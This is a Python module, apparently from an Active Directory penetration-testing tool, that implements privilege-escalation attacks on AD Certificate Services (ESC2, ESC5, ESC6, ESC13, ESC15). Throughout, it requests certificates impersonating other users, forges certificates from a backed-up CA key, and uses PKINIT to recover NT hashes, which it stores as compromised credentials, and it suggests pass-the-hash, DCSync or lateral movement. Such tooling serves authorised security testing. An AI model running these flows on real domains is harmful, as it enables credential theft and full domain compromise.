"""ESC2, ESC5, ESC6, ESC13, ESC15 — enrollment-based exploitation flows."""

from __future__ import annotations

from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_core.rich_output import print_info, print_success
from adscan_internal.services.adcs.cert_request import (
    CertRequestConfig,
    request_certificate_native,
)
from adscan_internal.services.adcs.cert_auth import (
    CertAuthConfig,
    authenticate_with_cert_native,
)
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult

# OID that makes a cert usable as an enrollment agent (ESC15)
_ENROLLMENT_AGENT_OID = "1.3.6.1.4.1.311.20.2.1"


def _output_dir(config: EscConfig, sub: str) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / sub
    d.mkdir(parents=True, exist_ok=True)
    return d


def _request_cfg(
    config: EscConfig,
    *,
    template: Optional[str] = None,
    upn: Optional[str] = None,
    on_behalf_of: Optional[str] = None,
    pfx_cred_path: Optional[str] = None,
    pfx_cred_pass: Optional[str] = None,
    application_policies: Optional[list[str]] = None,
) -> CertRequestConfig:
    _key_size = getattr(config, "min_key_size", None)
    return CertRequestConfig(
        domain=config.auth_domain,
        kdc_ip=config.auth_kdc,
        ca_host=config.ca_host,
        ca_name=config.ca_name,
        template=template or config.template or "",
        username=config.username,
        password=config.effective_secret,
        nt_hash=config.nt_hash,
        upn=upn,
        on_behalf_of=on_behalf_of,
        pfx_cred_path=pfx_cred_path,
        pfx_cred_pass=pfx_cred_pass,
        ca_fqdn=config.ca_fqdn,
        auth_domain=config.auth_domain,
        target_domain=config.domain,
        auth_kdc_ip=config.auth_kdc,
        target_kdc_ip=config.dc_ip,
        application_policies=application_policies,
        # Forward the workspace's fingerprinted lab provider so the cert
        # request failure panel can give lab-specific remediation hints
        # (GOAD: "vagrant up <ca_vm>") when applicable. None when the
        # operator is on a customer engagement / unknown lab.
        lab_provider=getattr(config.shell, "lab_provider", None) if config.shell is not None else None,
        **({} if _key_size is None else {"key_size": int(_key_size)}),
    )


async def _pkinit(
    config: EscConfig, pfx_path: Path, pfx_password: str, output_dir: Path
) -> EscResult:
    auth_cfg = CertAuthConfig(
        domain=config.domain,
        kdc_ip=config.dc_ip,
        pfx_path=pfx_path,
        pfx_password=pfx_password,
        username=config.target_upn.split("@")[0] if config.target_upn else None,
    )
    auth = await authenticate_with_cert_native(auth_cfg, output_dir)
    if not auth.success:
        return EscResult(
            success=False, esc=config.esc, error=auth.error or "PKINIT failed"
        )
    print_success(f"ESC{config.esc}: NT hash obtained")

    # Screenshot moment: ADCS ESC vulnerability confirmed exploitable end-to-end
    # (cert request -> PKINIT -> NT hash). Augments the print_success above.
    try:
        from adscan_core.rich_output_collection import (
            DiscoveryCard,
            print_discovery_card,
        )
        from adscan_core.output._state import mark_sensitive as _mark

        target_user = config.target_upn or (config.username or "principal")
        evidence_lines = [
            f"Cert issued by CA {config.ca_name or '?'} on {config.ca_host or '?'}",
            f"PKINIT to KDC {_mark(config.dc_ip or '?', 'ip')} succeeded",
        ]
        if auth.nt_hash:
            preview = (
                f"{auth.nt_hash[:8]}…{auth.nt_hash[-4:]}"
                if len(auth.nt_hash) > 12
                else auth.nt_hash
            )
            evidence_lines.append(f"NT: {_mark(preview, 'password')}")
        print_discovery_card(
            DiscoveryCard(
                severity="critical",
                headline=f"ADCS ESC{config.esc} EXPLOITED",
                target=_mark(str(target_user), "user"),
                evidence=tuple(evidence_lines),
                next_action=(
                    "Use the recovered NT hash for pass-the-hash, DCSync, or "
                    "lateral movement."
                ),
            )
        )
    except Exception as exc:  # pragma: no cover - presentation must never fail exploit
        telemetry.capture_exception(exc)

    # Centralised compromise-event emission. Every ESC that ends in PKINIT
    # converges here, so this is the single point that:
    #   1. Stores the recovered credential in the workspace credential store.
    #   2. Emits ``user_credential_obtained`` so the attack-path orchestrator
    #      transitions the active step from ``attempted`` → ``success`` and
    #      hands the execution context off to the newly compromised user.
    # Without this, ESC handlers would each have to wire success
    # propagation manually — ESC handlers added in the future would inherit
    # the bug. Mirrors the cli/exploits.py:add_shadow_credentials path that
    # already does this for GenericAll-style compromises.
    _emit_pkinit_compromise(config, auth.nt_hash)

    return EscResult(
        success=True,
        esc=config.esc,
        nt_hash=auth.nt_hash,
        ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
        pfx_path=str(pfx_path),
    )


def _emit_pkinit_compromise(config: EscConfig, nt_hash: str | None) -> None:
    """Store the credential and signal compromise to the orchestrator.

    Called at the single PTC convergence point so every ESC that recovers an
    NT hash triggers the same downstream events: credential store update,
    context handoff, and active-step success transition.
    """
    if not nt_hash:
        return
    shell = config.shell
    if shell is None:
        return  # lab harness without a shell — nothing to register

    target_principal = (
        (config.target_upn.split("@", 1)[0] if config.target_upn else "").strip()
        or (config.on_behalf_of.split("\\", 1)[-1] if config.on_behalf_of else "").strip()
        or config.target_account
        or config.username
    )
    if not target_principal:
        return

    try:
        if hasattr(shell, "add_credential"):
            shell.add_credential(
                config.domain,
                target_principal,
                nt_hash,
                prompt_for_user_privs_after=False,
                # Per-ESC provenance slug aligned with the attack_step_catalog
                # join key (``adcsesc1``..``adcsesc17``) so credential → attack
                # step → KB is a single join. The enrollment path knows exactly
                # which ESC/template it exploited via ``config.esc``.
                credential_origin=f"adcsesc{config.esc}",
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)

    try:
        from adscan_internal.cli.attack_step_followups import (  # pylint: disable=no-name-in-module
            set_last_execution_outcome,
        )

        set_last_execution_outcome(
            shell,
            {
                "key": "user_credential_obtained",
                "domain": config.domain,
                "target_domain": config.domain,
                "compromised_user": target_principal,
                "credential": nt_hash,
                "credential_type": "hash",
                "source_action": f"ADCSESC{config.esc}",
            },
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)

    # Transition the active attack-path step to "success" directly.  ESC
    # handlers set the edge to "attempted" before calling run_esc_sync; the
    # orchestrator's outcome-handoff machinery only fires for ACE-framework
    # steps, so ESC handlers need an explicit update here.  Using the
    # active-step updater (not update_edge_status_by_labels) ensures the
    # attack-graph-runtime log line fires and the UI reflects the correct state.
    try:
        from adscan_internal.services.attack_graph_runtime_service import (
            update_active_step_status,
        )

        update_active_step_status(
            shell,
            domain=config.domain,
            status="success",
            notes={
                "compromised_user": target_principal,
                "source_action": f"ADCSESC{config.esc}",
            },
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)


def _on_behalf_of_str(config: EscConfig) -> str:
    """Derive ``DOMAIN\\user`` string for ESC2/15 on-behalf-of phase."""
    target_user = config.on_behalf_of or (
        config.target_upn.split("@")[0]
        if "@" in config.target_upn
        else config.target_upn
    )
    if "\\" in target_user:
        return target_user
    return f"{config.domain.split('.')[0].upper()}\\{target_user}"


async def run_esc6(config: EscConfig) -> EscResult:
    """ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 — request cert with arbitrary UPN."""
    out = _output_dir(config, "esc6")
    try:
        req = await request_certificate_native(
            _request_cfg(config, upn=config.target_upn), out
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=6, error=str(exc))
    if not req.success:
        return EscResult(success=False, esc=6, error=req.error or "cert request failed")
    return await _pkinit(config, req.pfx_path, req.pfx_password or "", out)


async def run_esc2(config: EscConfig) -> EscResult:
    """ESC2: enroll in Any-Purpose template — use as enrollment agent — on-behalf-of."""
    out = _output_dir(config, "esc2")
    # Phase 1: obtain enrollment agent cert from the Any-Purpose template
    try:
        req1 = await request_certificate_native(_request_cfg(config), out)
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=2, error=str(exc))
    if not req1.success:
        return EscResult(
            success=False,
            esc=2,
            error=f"phase 1 cert request failed: {req1.error}"
            if req1.error
            else "phase 1 cert request failed",
        )

    print_info("ESC2: enrollment agent cert obtained, requesting on-behalf-of cert...")

    # Phase 2: use agent cert to enroll on behalf of target principal
    try:
        req2 = await request_certificate_native(
            _request_cfg(
                config,
                template="User",
                upn=config.target_upn,
                on_behalf_of=_on_behalf_of_str(config),
                pfx_cred_path=str(req1.pfx_path),
                pfx_cred_pass=req1.pfx_password or "",
            ),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=2, error=str(exc))
    if not req2.success:
        return EscResult(
            success=False,
            esc=2,
            error=req2.error or "phase 2 on-behalf-of request failed",
        )
    return await _pkinit(config, req2.pfx_path, req2.pfx_password or "", out)


async def run_esc15(config: EscConfig) -> EscResult:
    """ESC15: inject enrollment-agent application policy OID — on-behalf-of."""
    out = _output_dir(config, "esc15")
    # Phase 1: enroll on vulnerable template with enrollment-agent app policy OID in CSR
    try:
        req1 = await request_certificate_native(
            _request_cfg(config, application_policies=[_ENROLLMENT_AGENT_OID]),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=15, error=str(exc))
    if not req1.success:
        return EscResult(
            success=False,
            esc=15,
            error=f"phase 1 cert request failed: {req1.error}"
            if req1.error
            else "phase 1 cert request failed",
        )

    print_info(
        "ESC15: application-policy cert obtained, requesting on-behalf-of cert..."
    )

    # Phase 2: use that cert as enrollment agent, same as ESC2 phase 2
    try:
        req2 = await request_certificate_native(
            _request_cfg(
                config,
                template="User",
                upn=config.target_upn,
                on_behalf_of=_on_behalf_of_str(config),
                pfx_cred_path=str(req1.pfx_path),
                pfx_cred_pass=req1.pfx_password or "",
            ),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=15, error=str(exc))
    if not req2.success:
        return EscResult(
            success=False,
            esc=15,
            error=req2.error or "phase 2 on-behalf-of request failed",
        )
    return await _pkinit(config, req2.pfx_path, req2.pfx_password or "", out)


async def run_esc5(config: EscConfig) -> EscResult:
    """ESC5: CA admin → backup CA private key → forge arbitrary cert → PKINIT.

    Requires local admin (or Backup Operators) on the CA host.  Delegates to
    ca_backup_native (MS-SCMR service-creation chain) then forge_certificate_native.
    """
    from adscan_internal.services.adcs.ca_backup import (  # pylint: disable=no-name-in-module
        CABackupConfig,
        ca_backup_native,
        forge_certificate_native,
    )

    out = _output_dir(config, "esc5")
    backup_cfg = CABackupConfig(  # pylint: disable=unexpected-keyword-arg,no-value-for-parameter
        ca_host=config.ca_host,
        ca_name=config.ca_name,
        username=config.username,
        password=config.effective_secret or "",
        domain=config.auth_domain or config.domain,
        dc_ip=config.auth_kdc or config.dc_ip,
    )
    try:
        backup = await ca_backup_native(backup_cfg, out)
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=5, error=str(exc))
    if not backup.success:
        return EscResult(success=False, esc=5, error=backup.error or "CA backup failed")

    target_upn = config.target_upn or f"administrator@{config.domain}"
    try:
        forge = forge_certificate_native(
            ca_pfx_path=str(backup.pfx_path),
            ca_pfx_password=None,
            upn=target_upn,
            output_dir=out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=5, error=f"forge failed: {exc}")
    if not forge or not forge.pfx_path:
        return EscResult(success=False, esc=5, error="forge produced no certificate")

    print_success(f"ESC5: forged certificate for {target_upn}")
    return await _pkinit(config, forge.pfx_path, forge.pfx_password or "", out)


async def run_esc13(config: EscConfig) -> EscResult:
    """ESC13: enroll in template with linked issuance-policy group OID.

    The issued cert embeds the group's SID, granting effective group membership
    during Kerberos authentication (the KDC adds the group to the PAC).
    Exploitation is a plain enrollment — no on-behalf-of, no template write.
    The linked privileged group is set by the template's msPKI-Certificate-Policy OID.
    """
    out = _output_dir(config, "esc13")
    try:
        req = await request_certificate_native(
            _request_cfg(config, upn=config.target_upn), out
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        return EscResult(success=False, esc=13, error=str(exc))
    if not req.success:
        return EscResult(
            success=False, esc=13, error=req.error or "cert request failed"
        )

    print_info(
        "ESC13: certificate issued — embedded group OID grants privileged group membership at logon"
    )
    return await _pkinit(config, req.pfx_path, req.pfx_password or "", out)
